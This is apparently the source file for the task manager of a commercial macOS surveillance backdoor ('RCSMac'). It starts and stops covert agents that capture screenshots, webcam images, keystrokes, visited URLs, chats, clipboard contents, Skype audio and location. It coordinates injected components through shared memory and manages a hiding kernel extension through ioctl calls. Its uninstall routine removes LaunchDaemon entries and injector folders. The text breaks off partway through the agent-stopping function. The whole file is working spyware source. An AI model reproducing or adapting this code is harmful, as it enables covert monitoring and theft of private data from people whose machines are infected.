/*
 * RCSMac - Task Manager
 *  This class will be responsible for managing all the operations within
 *  Events/Actions/Agents, thus the Core will have to deal with them in the
 *  most generic way.
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <sys/ipc.h>
#import <sys/ioctl.h>

#import "RCSMAgentScreenshot.h"
#import "RCSMAgentWebcam.h"
#import "RCSMAgentOrganizer.h"
#import "RCSMAgentPosition.h"
#import "RCSMAgentDevice.h"

#import "NSMutableDictionary+ThreadSafe.h"

#import "RCSMSharedMemory.h"
#import "RCSMTaskManager.h"
#import "RCSMConfManager.h"
#import "RCSMLogManager.h"
#import "RCSMActions.h"
#import "RCSMEvents.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

//#define DEBUG_TASK_MANAGER

static RCSMTaskManager *sharedTaskManager = nil;
static NSLock *gTaskManagerLock           = nil;
static NSLock *gSyncLock                  = nil;

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSMTaskManager

@synthesize mEventsList;
@synthesize mActionsList;
@synthesize mAgentsList;
@synthesize mBackdoorID;
@synthesize mBackdoorControlFlag;
@synthesize mShouldReloadConfiguration;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSMTaskManager *)sharedInstance
{
@synchronized(self)
  {
    if (sharedTaskManager == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedTaskManager;
}

+ (id)allocWithZone: (NSZone *)aZone
{
@synchronized(self)
  {
    if (sharedTaskManager == nil)
      {
        sharedTaskManager = [super allocWithZone: aZone];
      
        //
        // Assignment and return on first allocation
        //
        return sharedTaskManager;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
    {
      if (sharedTaskManager != nil)
        {
          self = [super init];
          
          if (self != nil)
            {
              mEventsList   = [[NSMutableArray alloc] init];
              mActionsList  = [[NSMutableArray alloc] init];
              mAgentsList   = [[NSMutableArray alloc] init];
              
              mShouldReloadConfiguration = FALSE;
              
              mConfigManager = [[RCSMConfManager alloc] initWithBackdoorName:
                                [[[NSBundle mainBundle] executablePath] lastPathComponent]];
              
              mActions = [[RCSMActions alloc] init];
              
              key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
              key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
              
              gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
                                                                      size: SHMEM_COMMAND_MAX_SIZE
                                                             semaphoreName: SHMEM_SEM_NAME];
              [gSharedMemoryCommand createMemoryRegion];
              [gSharedMemoryCommand attachToMemoryRegion];
              
              gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
                                                                      size: SHMEM_LOG_MAX_SIZE
                                                             semaphoreName: SHMEM_SEM_NAME];
              [gSharedMemoryLogging createMemoryRegion];
              [gSharedMemoryLogging attachToMemoryRegion];
              
              gTaskManagerLock  = [[NSLock alloc] init];
              mIsSyncing        = NO;
              
              sharedTaskManager = self;
            }
        }
    }
  
  return sharedTaskManager;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Generic backdoor operations
#pragma mark -

- (BOOL)loadInitialConfiguration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([mConfigManager loadConfiguration] == YES)
    {
      //
      // Start all the enabled agents
      //
#ifndef NO_START_AT_LAUNCH
      [self startAgents];
#endif
      
#ifdef DEBUG_TASK_MANAGER
      infoLog(@"All Agents started");
#endif
      
      //
      // Start events monitoring
      //
      [self eventsMonitor];
      /*
      [NSThread detachNewThreadSelector: @selector(eventsMonitor)
                               toTarget: self
                             withObject: nil];
      */
    }
  else
    {
#ifdef DEBUG_TASK_MANAGER
      infoLog(@"An error occurred while loading the configuration file");
#endif

      exit(-1);
    }
  
  [outerPool release];
  
  return TRUE;
}

- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
{
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Writing new configuration");
#endif
  
  NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
                                 [[NSBundle mainBundle] bundlePath],
                                 gConfigurationName];

  NSString *configurationUpdatePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                       [[NSBundle mainBundle] bundlePath],
                                       gConfigurationUpdateName];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: configurationUpdatePath] == TRUE)
    {
      [[NSFileManager defaultManager] removeItemAtPath: configurationUpdatePath
                                                 error: nil];
    }
  
  [aConfigurationData writeToFile: configurationUpdatePath
                       atomically: YES];
  
  if ([mConfigManager checkConfigurationIntegrity: configurationUpdatePath])
    {
#ifdef DEBUG_TASK_MANAGER
      infoLog(@"checkConfigurationIntegrity went ok");
#endif
      
      //
      // If we're here it means that the file is ok thus it is safe to replace
      // the original one
      //
      if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
                                                     error: nil])
        {
          if ([[NSFileManager defaultManager] moveItemAtPath: configurationUpdatePath
                                                      toPath: configurationPath
                                                       error: nil])
            {
              self.mShouldReloadConfiguration = YES;
              
              [configurationPath release];
              [configurationUpdatePath release];
              
              return TRUE;
            }
        }
      else
        {
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Error while removing config name");
#endif
        }
    }
  else
    {
      //
      // In case of errors remove the temp file
      //
      [[NSFileManager defaultManager] removeItemAtPath: configurationUpdatePath
                                                 error: nil];
    }
  
  [configurationPath release];
  [configurationUpdatePath release];
  
  return FALSE;
}

- (BOOL)reloadConfiguration
{
  if (mShouldReloadConfiguration == YES)
    {
      mShouldReloadConfiguration = NO;
      
      //
      // Now stop all the agents and reload configuration
      //
      if ([self stopEvents] == TRUE)
        {
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Events stopped correctly");
#endif
          
          if ([self stopAgents] == TRUE)
            {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Agents stopped correctly");
#endif
              
              //
              // Now reload configuration
              //
              if ([mConfigManager loadConfiguration] == YES)
                {
                  // Clear the command shared memory
                  [gSharedMemoryCommand zeroFillMemory];
                  
                  // Clear the log shared memory from the configurations
                  [gSharedMemoryLogging clearConfigurations];
                  
                  //
                  // Start agents
                  //
                  [self startAgents];
                  
                  //
                  // Start event thread here
                  //
                  [self eventsMonitor];
                }
              else
                {
                  // previous one
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"An error occurred while reloading the configuration file");
#endif
                  
                  return NO;
                }
            }
        }
    }
  
  return YES;
}

- (void)uninstallMeh
{
  [gControlFlagLock lock];
  mBackdoorControlFlag = @"STOP";
  [gControlFlagLock unlock];
  
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Action Uninstall started!");
#endif
  
  BOOL lckRet = NO;
  lckRet = [gSuidLock lockBeforeDate: [NSDate dateWithTimeIntervalSinceNow: 60]];
  
#ifdef DEBUG_TASK_MANAGER
  if (lckRet == NO) 
    {
      infoLog(@"%s: enter critical session with timeout [euid/uid %d/%d]", 
              __FUNCTION__, geteuid(), getuid());
    }
  else
    {
      infoLog(@"%s: enter critical session normaly [euid/uid %d/%d]", 
              __FUNCTION__, geteuid(), getuid());
    }
#endif

  /*if ([self stopEvents] == TRUE)
  //if (1)
    {
#ifdef DEBUG_TASK_MANAGER
      infoLog(@"Events stopped correctly");
#endif
      
      if ([self stopAgents] == TRUE)
      //if (2)
        {
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Agents stopped correctly");
#endif*/
          
          /*
          //
          // Delete log files
          //
          NSString *encryptedLogExtension = [[mConfigManager encryption] 
                                             scrambleForward: NEWCONF
                                                        seed: gBackdoorSignature[0]];
          
          NSArray *logFiles = searchFile(encryptedLogExtension);
          
          for (NSString *logFile in logFiles)
            {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Removing log: %@", logFile);
#endif
              [[NSFileManager defaultManager] removeItemAtPath: logFile
                                                         error: nil];
            }
          */
          
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Uninstall called");
          infoLog(@"Closing active logs");
#endif
          
          RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
          if ([_logManager closeActiveLogsAndContinueLogging: NO])
            {
#ifdef DEBUF
              infoLog(@"Active logs closed correctly");
#endif
            }
          else
            {
#ifdef DEBUG_TASK_MANAGER
              errorLog(@"An error occurred while closing active logs");
#endif
            }
          
          //
          // Remove the LaunchDaemon plist
          //
          NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
                                     [[[[[NSBundle mainBundle] bundlePath]
                                        stringByDeletingLastPathComponent]
                                       stringByDeletingLastPathComponent]
                                      stringByDeletingLastPathComponent],
                                     BACKDOOR_DAEMON_PLIST ];
          
          [[NSFileManager defaultManager] removeItemAtPath: backdoorPlist
                                                     error: nil];
          
          int kextFD  = open(BDOR_DEVICE, O_RDWR);
          int ret     = 0;
          int activeBackdoors = 1;
          
          // Show KEXT
          //ret = ioctl(kextFD, MCHOOK_SHOWK);
          
          //
          // Get the number of active backdoors since we won't remove the
          // input manager if there's even one still registered
          //
          ret = ioctl(kextFD, MCHOOK_GET_ACTIVES, &activeBackdoors);
          
          const char *userName = [NSUserName() UTF8String];
          ret = ioctl(kextFD, MCHOOK_UNREGISTER, userName);
          
          sleep(1);
          
          // Just ourselves
          if (activeBackdoors == 1)
            {
              if (getuid() == 0 || geteuid() == 0)
                {
                  NSString *destDir = nil;
                  
                  if (gOSMajor == 10 && gOSMinor == 6) 
                    {
#ifdef DEBUG_TASK_MANAGER
                      infoLog(@"Removing scripting additions");
#endif
                      destDir = [[NSString alloc]
                                    initWithFormat: @"/Library/ScriptingAdditions/%@",
                                           OSAX_FOLDER ];
                    }
                  else if (gOSMajor == 10 && gOSMinor == 5) 
                    {
#ifdef DEBUG_TASK_MANAGER
                      infoLog(@"Removing input manager");
#endif
                      destDir = [[NSString alloc]
                                           initWithFormat: @"/Library/InputManagers/%@",
                                           INPUT_MANAGER_FOLDER ];
                    }
                
                  NSError *err;
                  
                  if (![[NSFileManager defaultManager] removeItemAtPath: destDir
                                                                  error: &err])
                    {
#ifdef DEBUG_TASK_MANAGER
                      infoLog(@"uid  = %d", getuid());
                      infoLog(@"euid = %d\n", geteuid());
                      infoLog(@"Error while removing the input manager");
                      infoLog(@"error: %@", [err localizedDescription]);
#endif
                    }
                  
                  [destDir release];
                }
              else
                {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"I don't have privileges for removing the input manager :(");
                  infoLog(@"uid (%d) euid (%d)", getuid(), geteuid());
#endif
                }
            }
          else
            {
#ifdef DEBUG_TASK_MANAGER
              warnLog(@"Won't remove injector, there are still registered backdoors (%d)", activeBackdoors);
#endif
            }
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Removing SLI Plist just in case");
#endif
          [gUtil removeBackdoorFromSLIPlist];
          
          //
          // Remove our working dir
          //
          if ([[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                                         error: nil])
            {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Backdoor dir removed correctly");
#endif
            }
          else
            {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"An error occurred while removing backdoor dir");
#endif
            }
          
          [gSharedMemoryCommand detachFromMemoryRegion];
          
#ifdef DEMO_VERSION
          changeDesktopBackground(@"/Library/Desktop Pictures/Aqua Blue.jpg", TRUE);
#endif
          
          // Unregister uspace component
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Unregistering uspace components");
#endif

          close(kextFD);
          
          //
          // Unload our service from LaunchDaemon
          //
          NSArray *_commArguments = [[NSArray alloc] initWithObjects:
                                     @"remove",
                                     [[backdoorPlist lastPathComponent]
                                      stringByDeletingPathExtension],
                                     nil];
          [gUtil executeTask: @"/bin/launchctl"
                withArguments: _commArguments
                 waitUntilEnd: YES];
          
          sleep(3);
          //[gUtil release];
        
          [gSuidLock unlock];
  
#ifdef DEBUG_TASK_MANAGER
    infoLog(@"%s: exit critical session [euid/uid %d/%d]", 
          __FUNCTION__, geteuid(), getuid());
#endif
          exit(0);
        //}
    //}
}

#pragma mark -
#pragma mark Agents
#pragma mark -

- (id)initAgent: (u_int)agentID
{
  return FALSE;
}

- (BOOL)startAgent: (u_int)agentID
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
  
  NSMutableDictionary *agentConfiguration = nil;
  NSMutableData *agentCommand             = nil;
  
  switch (agentID)
    {
    case AGENT_SCREENSHOT:
      {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Starting Agent Screenshot");
#endif
        RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if (agentConfiguration != nil)
          {
            if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
                && [agentConfiguration objectForKey: @"status"] != AGENT_START)
              {
                [agentConfiguration setObject: AGENT_START forKey: @"status"];
                [agentScreenshot setAgentConfiguration: agentConfiguration];
                
                [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentScreenshot
                                       withObject: nil];
              }
            else
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Agent Screenshot is already running");
#endif
              }
          }
        else
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Agent not found");
#endif

            return FALSE;
          }
        break;
      }
#if 0
    case AGENT_ORGANIZER:
      {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Starting Agent Organizer");
#endif
        RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if (agentConfiguration == nil)
          {
#ifdef DEBUG_TASK_MANAGER
            errorLog(@"Internal config for agent Organizer not found");
#endif
            return FALSE;
          }
        
        [agentConfiguration setObject: AGENT_START
                               forKey: @"status"];
        [agentOrganizer setAgentConfiguration: agentConfiguration];
        
        [NSThread detachNewThreadSelector: @selector(start)
                                 toTarget: agentOrganizer
                               withObject: nil];
        
        break;
      }
#endif
    case AGENT_CAM:
      {   
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Starting Agent Webcam");
#endif
        RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
        
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];
            
            [agentWebcam setAgentConfiguration: agentConfiguration];
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentWebcam
                                   withObject: nil];
          }
        else
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Agent Webcam is already running");
#endif
          }
        break;
      }
    case AGENT_KEYLOG:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID   = agentID;
            shMemoryHeader->direction = D_TO_AGENT;
            shMemoryHeader->command   = AG_START;
            
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Creating KEYLOG Agent log file");
#endif
            BOOL success = [_logManager createLog: AGENT_KEYLOG
                                      agentHeader: nil
                                        withLogID: 0];
            
            if (success == TRUE)
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Keylogger");
#endif
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_KEYLOG
                                        fromComponent: COMP_CORE] == TRUE)
                  {
                    [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Start command sent to Agent Keylog", agentID);
#endif
                  }
                else
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Error while sending start command to the agent");
#endif
                    
                    [agentCommand release];
                    [agentConfiguration release];
                    return NO;
                  }
              }
          }
        break;
      }
    case AGENT_URL:
      {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Starting Agent URL");
#endif
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID = agentID;
            shMemoryHeader->direction = D_TO_AGENT;
            shMemoryHeader->command = AG_START;
            
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Creating URL Agent log file");
#endif
            BOOL success = [_logManager createLog: AGENT_URL
                                      agentHeader: nil
                                        withLogID: 0];
            
            if (success == TRUE)
              {
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_URL
                                        fromComponent: COMP_CORE] == TRUE)
                  {
                    [agentConfiguration setObject: AGENT_RUNNING
                                           forKey: @"status"];
                    
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Start command sent to Agent URL", agentID);
#endif
                  }
                else
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"An error occurred while starting agent URL");
#endif
                    
                    [agentCommand release];
                    [agentConfiguration release];
                    return NO;
                  }
              }
          }
        break;
      }
    case AGENT_APPLICATION:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
        {
          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
          shMemoryHeader->agentID   = agentID;
          shMemoryHeader->direction = D_TO_AGENT;
          shMemoryHeader->command   = AG_START;
          
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Creating APPLICATION Agent log file");
#endif
          BOOL success = [_logManager createLog: AGENT_APPLICATION
                                    agentHeader: nil
                                      withLogID: 0];
          
          if (success == TRUE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Starting Agent Application");
#endif
            if ([gSharedMemoryCommand writeMemory: agentCommand
                                           offset: OFFT_APPLICATION
                                    fromComponent: COMP_CORE] == TRUE)
            {
              [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Start command sent to Agent Application", agentID);
#endif
            }
            else
            {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Error while sending start command to the agent");
#endif
              
              [agentCommand release];
              [agentConfiguration release];
              return NO;
            }
          }
        }
        break;
      }
    case AGENT_MOUSE:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [self getConfigForAgent: agentID];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID     = AGENT_MOUSE;
            shMemoryHeader->direction   = D_TO_AGENT;
            shMemoryHeader->command     = AG_START;
            
            NSMutableData *mouseConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
            NSData *agentConf = [agentConfiguration objectForKey: @"data"];
                
            shMemoryLog *_mouseConfig     = (shMemoryLog *)[mouseConfig bytes];
            _mouseConfig->agentID         = AGENT_MOUSE;
            _mouseConfig->direction       = D_TO_AGENT;
            _mouseConfig->commandType     = CM_AGENT_CONF;
            _mouseConfig->commandDataSize = [agentConf length];
            
            memcpy(_mouseConfig->commandData,
                   [agentConf bytes],
                   [agentConf length]);
            
            if ([gSharedMemoryLogging writeMemory: mouseConfig
                                           offset: 0
                                    fromComponent: COMP_CORE] == TRUE)
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Mouse");
#endif
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_MOUSE
                                        fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Start command sent to Agent Mouse", agentID);
#endif
                    [agentConfiguration setObject: AGENT_RUNNING
                                           forKey: @"status"];
                  }
                else
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"An error occurred while starting agent URL");
#endif
                    
                    [agentCommand release];
                    return NO;
                  }
              }
          }
        break;
      }
    case AGENT_CHAT:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID   = agentID;
            shMemoryHeader->direction = D_TO_AGENT;
            shMemoryHeader->command   = AG_START;
            
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Creating CHAT Agent log file");
#endif
            BOOL success = [_logManager createLog: AGENT_CHAT
                                      agentHeader: nil
                                        withLogID: 0];
            
            if (success == TRUE)
              {
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_IM
                                        fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Start command sent to Agent CHAT", agentID);
#endif
                    [agentConfiguration setObject: AGENT_RUNNING
                                           forKey: @"status"];
                  }
                else
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"An error occurred while starting agent URL");
#endif
                    
                    [agentCommand release];
                    [agentConfiguration release];
                    return NO;
                  }
              }
          }
        break;
      }
    case AGENT_CLIPBOARD:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID         = agentID;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_START;
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Creating CLIPBOARD Agent log file");
#endif
            BOOL success = [_logManager createLog: AGENT_CLIPBOARD
                                      agentHeader: nil
                                        withLogID: 0];
            if (success == TRUE)
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Clipboard");
#endif
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_CLIPBOARD
                                        fromComponent: COMP_CORE] == TRUE)
                  {
                    [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Start command sent to Agent Clipboard", agentID);
#endif
                  }
                else
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Error while sending start command to the agent");
#endif
                    
                    [agentCommand release];
                    [agentConfiguration release];
                    return NO;
                  }
              }
          }
        break;
      }    
    case AGENT_VOIP:
      {
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration retain];
        
        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
            [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID     = AGENT_VOIP;
            shMemoryHeader->direction   = D_TO_AGENT;
            shMemoryHeader->command     = AG_START;
            
            NSMutableData *voipConfig = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
            NSData *agentConf = [agentConfiguration objectForKey: @"data"];
            
            voipStruct *voipConfiguration = (voipStruct *)[agentConf bytes];
            gSkypeQuality                 = voipConfiguration->compression;
            
            shMemoryLog *_voipConfig     = (shMemoryLog *)[voipConfig bytes];
            _voipConfig->status          = SHMEM_WRITTEN;
            _voipConfig->agentID         = AGENT_VOIP;
            _voipConfig->direction       = D_TO_AGENT;
            _voipConfig->commandType     = CM_AGENT_CONF;
            _voipConfig->commandDataSize = [agentConf length];
            
            memcpy(_voipConfig->commandData,
                   [agentConf bytes],
                   [agentConf length]);
            
            if ([gSharedMemoryLogging writeMemory: voipConfig
                                           offset: 0
                                    fromComponent: COMP_CORE] == TRUE)
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Voip - conf sent");
#endif
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_VOIP
                                        fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Start command sent to Agent Voip", agentID);
#endif
                    [agentConfiguration setObject: AGENT_RUNNING
                                           forKey: @"status"];
                  }
                else
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"An error occurred while starting agent URL");
#endif
                    
                    [agentCommand release];
                    [agentConfiguration release];
                    [voipConfig release];
                    return NO;
                  }
              }
            
            [voipConfig release];
          }
        
        break;
      }
      case AGENT_POSITION:
      {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Starting Agent Position");
#endif
        RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if (agentConfiguration != nil)
        {
          if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
              && [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];
            [agentPosition setAgentConfiguration: agentConfiguration];
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentPosition
                                   withObject: nil];
          }
          else
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Agent Position is already running");
#endif
          }
        }
        else
        {
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Agent not found");
#endif
          
          return FALSE;
        }
        break;
      }
    case AGENT_DEVICE:
      {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Starting Agent Device");
#endif
        RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        if (agentConfiguration != nil)
        {
          if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
              && [agentConfiguration objectForKey: @"status"] != AGENT_START)
          {
            [agentConfiguration setObject: AGENT_START forKey: @"status"];
            [agentDevice setAgentConfiguration: agentConfiguration];
            
            [NSThread detachNewThreadSelector: @selector(start)
                                     toTarget: agentDevice
                                   withObject: nil];
          }
          else
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Agent Device is already running");
#endif
          }
        }
        else
        {
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Agent not found");
#endif
          return FALSE;
        }
        break;
      }
    default:
      {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"%s Unsupported agent: 0x%04x", __FUNCTION__, agentID);
#endif
        
        return NO;
      }
    }

  if (agentCommand != nil)
    {
      [agentCommand release];
    }
  if (agentConfiguration != nil)
    {
      [agentConfiguration release];
    }
  
  [outerPool release];
  
  return YES;
}

- (BOOL)restartAgent: (u_int)agentID
{
  return YES;
}

- (BOOL)suspendAgent: (u_int)agentID
{
  return YES;
}

- (BOOL)stopAgent: (u_int)agentID
{
  RCSMLogManager *_logManager = [RCSMLogManager sharedInstance];
  NSMutableDictionary *agentConfiguration;
  NSData *agentCommand;
  
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Stop Agent called, 0x%x", agentID);
#endif
  
  switch (agentID)
    {
    case AGENT_SCREENSHOT:
      {
#ifdef DEBUG_TASK_MANAGER        
        infoLog(@"Stopping Agent Screenshot");
#endif
        RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
        
        if ([agentScreenshot stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while stopping agent Screenshot");
#endif
            return NO;
          }
        
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
        
        break;
      }
#if 0
    case AGENT_ORGANIZER:
      {
#ifdef DEBUG_TASK_MANAGER        
        warnLog(@"Stopping Agent Organizer");
#endif
        RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
      
        if ([agentOrganizer stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
            errorLog(@"Error while stopping agent Organizer");
#endif
            return NO;
          }
        
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
        
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Organizer stopped correctly");
#endif
        break;
      }
#endif
    case AGENT_CAM:
      {
#ifdef DEBUG_TASK_MANAGER        
        infoLog(@"Stopping Agent WebCam");
#endif
        RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
        
        if ([agentWebcam stop] == FALSE)
          {
#ifdef DEBUG_TASK_MANAGER
